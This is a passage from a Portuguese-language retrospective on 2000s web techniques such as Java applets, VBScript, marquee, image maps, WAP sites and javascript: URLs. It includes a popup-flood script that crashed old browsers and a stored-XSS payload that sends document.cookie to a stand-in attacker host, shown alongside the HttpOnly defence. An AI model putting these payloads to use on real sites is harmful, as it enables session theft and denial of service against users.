*Fontes: [Adobe Flash](https://en.wikipedia.org/wiki/Adobe_Flash) — Wikipedia; [ActionScript](https://en.wikipedia.org/wiki/ActionScript) — Wikipedia*

---

## Java Applet: Java rodando dentro do navegador

Antes do Flash dominar, e em paralelo a ele, existiam os **Java Applets**. Você compilava uma classe Java, empacotava num `.jar`, e incorporava direto no HTML:

```html
<applet code="GraficoVendas.class"
        archive="grafico.jar"
        width="640" height="480"
        alt="Gráfico de vendas — requer Java">
  <param name="dados" value="jan:100,fev:150,mar:80">
  <param name="cor_barra" value="0066CC">
  Seu browser não suporta Java Applets.
  <a href="grafico.html">Ver versão alternativa</a>
</applet>
```

```java
// GraficoVendas.java
import java.applet.Applet;
import java.awt.Graphics;
import java.awt.Color;

public class GraficoVendas extends Applet {

  public void init() {
    String dados = getParameter("dados");
    // processa o parâmetro passado pelo HTML
  }

  public void paint(Graphics g) {
    g.setColor(Color.blue);
    g.fillRect(50, 100, 40, 200); // desenha a barra
    g.drawString("Jan", 55, 320);
  }
}
```

O browser carregava o Java Runtime Environment, que o usuário precisava ter instalado, e executava o bytecode dentro de uma sandbox. Applets tinham mais acesso ao sistema que JavaScript: podiam abrir conexões TCP, escrever arquivos com permissão explícita, acessar periféricos.

Sites bancários brasileiros usavam Applets nos módulos de segurança de autenticação, aqueles instaladores de "certificado digital" que travavam o browser por trinta segundos eram, na maioria dos casos, Applets Java.

O problema: a JVM demorava para carregar. A tela cinza com a xícara de café girando enquanto o Applet inicializava era uma experiência universal dos anos 2000.

O `<applet>` foi oficialmente removido do HTML5 em 2014. O suporte a Applets nos browsers foi encerrado entre 2015 e 2018.

*Fontes: [Java applet](https://en.wikipedia.org/wiki/Java_applet) — Wikipedia; [Removal of applet tag](https://html.spec.whatwg.org/multipage/obsolete.html#non-conforming-features) — WHATWG HTML Living Standard*

---

## VBScript vs JavaScript

O Internet Explorer suportava dois idiomas de scripting: JavaScript e **VBScript** (Visual Basic Scripting Edition). VBScript era criação da Microsoft, com sintaxe de Basic, e só rodava no IE.

```html
<script type="text/vbscript">
' VBScript — só funciona no Internet Explorer

Sub ExibirMensagem()
  MsgBox "Olá do VBScript!", vbInformation, "Meu Site"
End Sub

Function SomarNumeros(a, b)
  SomarNumeros = a + b
End Function

Dim resultado
resultado = SomarNumeros(10, 20)

If resultado > 25 Then
  Document.Write "<p>Resultado maior que 25: " & resultado & "</p>"
Else
  Document.Write "<p>Resultado: " & resultado & "</p>"
End If
</script>
```

```javascript
// JavaScript — funciona em todos os browsers
function exibirMensagem() {
  alert('Olá do JavaScript!');
}

function somarNumeros(a, b) {
  return a + b;
}

var resultado = somarNumeros(10, 20);
document.write('<p>Resultado: ' + resultado + '</p>');
```

Desenvolvedores que vinham do mundo ASP (Active Server Pages) levavam VBScript do servidor pro cliente. O problema era que qualquer usuário com Firefox ou Opera não executava o código, simplesmente nada acontecia.

A guerra foi curta. JavaScript ganhou porque rodava em todo browser. VBScript foi formalmente desativado no IE11 em 2014 e removido completamente do Edge.

*Fontes: [VBScript](https://en.wikipedia.org/wiki/VBScript) — Wikipedia; [VBScript deprecation](https://learn.microsoft.com/en-us/windows/whats-new/deprecated-features) — Microsoft Learn*

---

## `<marquee>`: texto que se movia era sinal de modernidade

O elemento `<marquee>` fazia o conteúdo se mover horizontalmente, ou verticalmente, dentro de um container. Não era recurso obscuro. Em 2000–2006, era praticamente obrigatório em sites de pequenas empresas, portais, webrings e páginas pessoais do Geocities.

Isso aqui ainda funciona em 2026:

<marquee direction="left" scrollamount="4" style="background:#000080; color:#ffff00; font-weight:bold; padding:8px; font-family:monospace;">
  &nbsp;&nbsp;&nbsp;★ Bem-vindo ao meu site! ★ Não esqueça de adicionar nos favoritos! ★ MSN: meunome@hotmail.com ★ Visite nossas páginas! ★&nbsp;&nbsp;&nbsp;
</marquee>

```html
<!-- horizontal: o clássico -->
<marquee>Bem-vindo ao nosso site! Confira nossas promoções!</marquee>

<!-- com velocidade e direção -->
<marquee direction="left" scrollamount="3" scrolldelay="50">
  Últimas notícias: Lorem ipsum dolor sit amet...
</marquee>

<!-- bounce: vai e volta -->
<marquee behavior="alternate" bgcolor="#ffff00">
  ⚡ NOVIDADE ⚡
</marquee>

<!-- vertical, pra quem queria ser diferente -->
<marquee direction="up" height="100" scrollamount="2">
  <p>Item 1</p>
  <p>Item 2</p>
  <p>Item 3</p>
</marquee>

<!-- o combo completo dos sites de 2002 -->
<marquee direction="left" scrollamount="5" loop="infinite"
         bgcolor="#000080" style="color: yellow; font-weight: bold;">
  &nbsp;&nbsp;&nbsp;★ Visite nossas páginas! ★ MSN: meunome@hotmail.com ★
  Não esqueça de adicionar nos favoritos! ★&nbsp;&nbsp;&nbsp;
</marquee>
```

O `<marquee>` era um elemento proprietário criado pela Microsoft pro IE, introduzido em 1995. O Netscape respondeu com `<blink>`, que fazia o texto piscar. Nenhum dos dois fazia parte das especificações HTML, mas ambos eram suportados pelos browsers porque os usuários *queriam* usar.

A W3C nunca padronizou o `<marquee>`. Mesmo assim, todos os browsers continuaram suportando por décadas por causa de compatibilidade. O HTML5 formalmente marcou o elemento como obsoleto, mas ele ainda funciona em todos os browsers modernos em 2024.

```javascript
// o marquee tinha uma API JavaScript também
var m = document.getElementById('meu-marquee');
m.stop();   // pausa
m.start();  // retoma
```

*Fontes: [marquee element](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/marquee) — MDN Web Docs; [A Brief History of the Marquee Tag](https://en.wikipedia.org/wiki/Marquee_element) — Wikipedia*

---

## Image map: regiões clicáveis numa imagem

Antes de CSS hover, ícones vetoriais e botões estilizados, a solução pra criar menus de navegação com formato irregular, como um mapa geográfico clicável ou os botões de uma interface de aparelho de som, era o **image map**.

Você carregava uma imagem única e mapeava regiões clicáveis em cima dela usando coordenadas de pixel:

```html
<!-- a imagem referencia o mapa pelo atributo usemap -->
<img src="mapa-brasil.gif"
     width="400" height="500"
     usemap="#mapa-regioes"
     alt="Mapa do Brasil — clique em um estado">

<!-- o mapa define as áreas clicáveis -->
<map name="mapa-regioes">

  <!-- rect: retângulo, coords = x1,y1,x2,y2 -->
  <area shape="rect"
        coords="150,50,300,120"
        href="norte.html"
        alt="Região Norte">

  <!-- circle: círculo, coords = cx,cy,raio -->
  <area shape="circle"
        coords="200,250,40"
        href="centro-oeste.html"
        alt="Centro-Oeste">

  <!-- poly: polígono irregular, coords = x1,y1,x2,y2,x3,y3,... -->
  <area shape="poly"
        coords="180,300,220,280,260,310,240,350,190,345"
        href="sudeste.html"
        alt="Região Sudeste">

</map>
```

As coordenadas eram calculadas manualmente ou com a ajuda de ferramentas do Dreamweaver, que deixava você desenhar as áreas em cima da imagem visualmente e gerava o HTML. Quando a imagem mudava de tamanho, todas as coordenadas precisavam ser recalculadas, os valores eram absolutos em pixels, não percentuais.

Pra interfaces de menus elaboradas, designers criavam uma imagem do menu inteiro e definiam cada botão como uma área retangular. O hover era feito com JavaScript trocando o atributo `src` da imagem por uma versão "acesa" do botão, o predecessor dos sprites CSS.

```javascript
// hover em image map — trocava a imagem inteira
function ativarBotao(area) {
  document.getElementById('menu-img').src = 'menu-hover-' + area + '.gif';
}

function desativarBotao() {
  document.getElementById('menu-img').src = 'menu-normal.gif';
}
```

```html
<area shape="rect" coords="0,0,100,40" href="inicio.html"
      onmouseover="ativarBotao('inicio')"
      onmouseout="desativarBotao()">
```

Image maps ainda existem no HTML5 e funcionam em todos os browsers modernos. São usados raramente, mas a sintaxe não mudou desde os anos 90.

*Fonte: [Image map](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/map) — MDN Web Docs*

---

## Popup flood: a pegadinha que travava o computador

Antes dos browsers bloquearem popups por padrão, `window.open()` abria uma nova janela sem pedir permissão nenhuma. Isso gerou uma categoria inteira de páginas maliciosas e de pegadinhas entre amigos, baseada em loop infinito de popups:

```javascript
// a versão clássica
while (true) {
  window.open('http://meusite.com/popup.html');
}
```

```javascript
// a versão "educada" que se auto-replicava
function abrirPopup() {
  var janela = window.open('', '', 'width=300,height=200');
  janela.document.write('<script>opener.abrirPopup();<\/script>');
}
abrirPopup();
```

Cada popup abria uma nova janela do Windows. Com IE6 no Windows 98 ou XP, depois de algumas dezenas de janelas abertas em sequência, o sistema inteiro travava. Não dava pra fechar um por um, o mouse parava de responder. A única saída era segurar o botão de power e reiniciar.

Sites de humor da época distribuíam links com títulos como *"não clique aqui"* ou *"clica pra ganhar um prêmio"*. A vítima clicava, a tela enchia de janelas em cascata, e o computador morria.

O Firefox 1.0 (2004) foi um dos primeiros a bloquear popups por padrão, com um aviso no topo da página: *"Firefox bloqueou um popup neste site."* O IE só adicionou bloqueio nativo no IE7, em 2006. Até lá, a única defesa era não clicar em links suspeitos, ou instalar uma toolbar do Yahoo que bloqueava por conta própria.

*Fonte: [Pop-up ad](https://en.wikipedia.org/wiki/Pop-up_ad) — Wikipedia*

---

## `javascript:` na URL: código no lugar de endereço

Era comum o JavaScript ser executado diretamente da barra de endereços ou em links `<a>`. Qualquer elemento `<a>` com `href="javascript:..."` executava o código ao ser clicado, sem navegar para lugar nenhum.

```html
<!-- botão de voltar sem depender do servidor -->
<a href="javascript:history.back()">← Voltar</a>

<!-- abrir popup com parâmetros controlados -->
<a href="javascript:window.open('ajuda.html','ajuda','width=400,height=300')">
  Ajuda
</a>

<!-- confirmar antes de navegar -->
<a href="javascript:if(confirm('Tem certeza que deseja sair?')) window.location='logout.php'">
  Sair
</a>

<!-- o clássico "link que não faz nada" -->
<a href="javascript:void(0)" onclick="abrirMenu()">Menu</a>
```

`javascript:void(0)` era um padrão para tornar um link clicável para eventos sem navegar. `void(0)` avalia a expressão `0` e retorna `undefined`, impedindo a navegação padrão.

O mesmo protocolo funcionava na barra de endereços. No IE6 e no Firefox 2, era possível digitar diretamente:

```
javascript:alert(document.cookie)
```

O browser executava o código no contexto da página atual. Desenvolvedores usavam isso para testar pequenos trechos sem precisar abrir o Firebug, que ainda era novo.

O problema de segurança: se qualquer parte da aplicação ecoava entrada do usuário diretamente num atributo `href`, o atacante injetava código. Se uma página de perfil renderizava `<a href="[site do usuário]">`, e o atacante se cadastrava com `javascript:document.location='https://atacante.com?c='+document.cookie` no campo "site pessoal", qualquer visitante que clicasse no link vazava a sessão.

```html
<!-- campo "site pessoal" do cadastro preenchido pelo atacante com: -->
<!-- javascript:document.location='https://atacante.com?c='+document.cookie -->

<!-- saída no perfil da vítima, sem sanitização: -->
<a href="javascript:document.location='https://atacante.com?c='+document.cookie">
  Site pessoal
</a>
```

O roubo de cookie era agravado por outro detalhe: o atributo `HttpOnly` não existia na prática em 2006. Ele foi introduzido pela Microsoft no IE6 SP1 em 2002, mas era desconhecido pela maioria dos desenvolvedores e não havia especificação formal. Sem `HttpOnly`, `document.cookie` era acessível a qualquer JavaScript da página, incluindo código injetado. A especificação oficial só veio com a RFC 6265, em 2011.

```php
<?php
// sem HttpOnly: cookie acessível por JavaScript
setcookie('sessao', $token, time() + 3600, '/');

// com HttpOnly: JavaScript não consegue ler o cookie
setcookie('sessao', $token, time() + 3600, '/', '', false, true);
// o último parâmetro true é o httponly
?>
```

Em 2006, praticamente nenhum cookie de sessão usava `HttpOnly`. Qualquer XSS na página, por `javascript:` em `href`, por `eval()` em dados do servidor, ou por qualquer outro vetor, resultava em `document.cookie` exposto e sessão comprometida.

O protocolo `javascript:` ainda funciona em 2026 em qualquer browser. O que mudou foi o contexto ao redor: React, Vue e Angular sanitizam URLs por padrão e rejeitam o protocolo em atributos dinâmicos. CSP pode bloquear execução inline. Em 2006, não havia nenhuma dessas camadas, e event handlers inline misturados com `javascript:` em `href` eram padrão sem segunda consideração.

*Fonte: [javascript: URLs](https://developer.mozilla.org/en-US/docs/Web/URI/Schemes/javascript) — MDN Web Docs*

---

## Site mobile era um site separado

Não existia responsive design. CSS Media queries só foram especificadas em 2010 e levaram anos pra ser adotadas. Antes disso, a solução era manter dois sites completamente diferentes: um pra desktop e um pra mobile, em subdomínios separados.

A Globo tinha `globo.com` e `m.globo.com`. O Orkut tinha `orkut.com` e `m.orkut.com`. O UOL, iG, Terra, todos mantinham versões `m.` em paralelo. O servidor detectava o `User-Agent` da requisição e redirecionava:

```php
<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'];

$mobile_agents = array(
    'Nokia', 'SonyEricsson', 'Motorola', 'Samsung',
    'BlackBerry', 'Windows CE', 'Opera Mini', 'MOT-',
    'UP.Browser', 'MIDP', 'WAP', 'J2ME'
);

$is_mobile = false;
foreach ($mobile_agents as $agent) {
    if (stripos($user_agent, $agent) !== false) {
        $is_mobile = true;
        break;
    }
}

if ($is_mobile) {
    header('Location: http://m.meusite.com.br/');
    exit;
}
?>
```

O site mobile não era uma versão simplificada do desktop. Era outro projeto, com outro HTML, outro CSS, outra estrutura. A razão era o pacote de dados. Em 2006, navegar pelo celular no Brasil custava por kilobyte transferido, não por tempo, por dado. Uma página com imagens pesadas podia custar caro na conta do usuário além de demorar minutos pra carregar num GPRS de 40kbps.

Os sites `m.` seguiam regras rígidas:

- Sem imagens decorativas, só imagens essenciais em baixa resolução
- Sem JavaScript quando possível, ou o mínimo absoluto
- HTML enxuto, sem divs desnecessárias
- Textos curtos, links grandes pra clicar com o dedo ou com o botão direcional do celular
- Sem tabelas complexas, layout linear de cima pra baixo

O formato predominante era **WAP** (Wireless Application Protocol) com **WML** (Wireless Markup Language), uma linguagem parecida com HTML mas projetada pra displays minúsculos e conexões lentas:

```xml
<?xml version="1.0"?>
<!DOCTYPE wml PUBLIC "-//WAPFORUM//DTD WML 1.1//EN"
  "http://www.wapforum.org/DTD/wml_1.1.xml">
<wml>
  <card id="index" title="Meu Site">
    <p>Bem-vindo ao site.</p>
    <p><a href="noticias.wml">Ver notícias</a></p>
    <p><a href="contato.wml">Contato</a></p>
  </card>
</wml>
```

WML não tinha `<div>`, não tinha CSS, não tinha JavaScript. O conteúdo era organizado em `<card>` dentro de `<wml>`. Cada card era uma tela. A navegação entre cards era feita por links, e o browser WAP do celular renderizava tudo em texto puro.

O iPhone foi lançado em junho de 2007. O Android em outubro de 2008. Quando esses dispositivos chegaram com browsers que renderizavam HTML de desktop em telas touch, o `m.` começou a morrer. O último grande site a abandonar o subdomínio mobile separado e adotar responsive design foi o Facebook, em 2013.

*Fontes: [WAP](https://en.wikipedia.org/wiki/Wireless_Application_Protocol) — Wikipedia; [Responsive Web Design](https://alistapart.com/article/responsive-web-design/) — Ethan Marcotte, A List Apart, 2010 (artigo que definiu o termo)*

---

## O que ficou

Algumas dessas técnicas não sumiram completamente. `clearfix` ainda aparece em código legado. Vendor prefixes ainda existem em propriedades experimentais do CSS. Muitas APIs antigas ainda respondem JSONP mesmo depois de décadas.

Mas o ambiente mudou de forma que quem programou nessa época e quem começou depois literalmente não falam a mesma língua quando descrevem o mesmo problema.

"Como você centrava um elemento verticalmente?" é uma pergunta com respostas radicalmente diferentes dependendo de quando você aprendeu.

Em 2006, a resposta envolvia `position: absolute`, `top: 50%`, `margin-top` negativo e uma calculadora. Hoje é `display: flex; align-items: center`.

O problema era o mesmo. O mundo era completamente diferente.

---

*Ferramentas da época mencionadas:*

- **Macromedia Dreamweaver MX** — editor WYSIWYG + código (adquirido pela Adobe em 2005)
- **Microsoft FrontPage** — editor de sites integrado ao pacote Office (descontinuado em 2006)
- **CorelDRAW** — usado para criar e fatiar layouts antes de exportar pra HTML
- **Firebug** — primeiro inspetor de elementos real, extensão do Firefox
- **CSS3 PIE** — `PIE.htc` para `border-radius` e `box-shadow` no IE
- **jQuery** — biblioteca que abstraía inconsistências entre browsers, lançada em janeiro de 2006
- **Adobe Flash Player** — plugin de browser para executar arquivos `.swf` (descontinuado em dezembro de 2020)
- **Java Runtime Environment (JRE)** — necessário para rodar Applets no browser
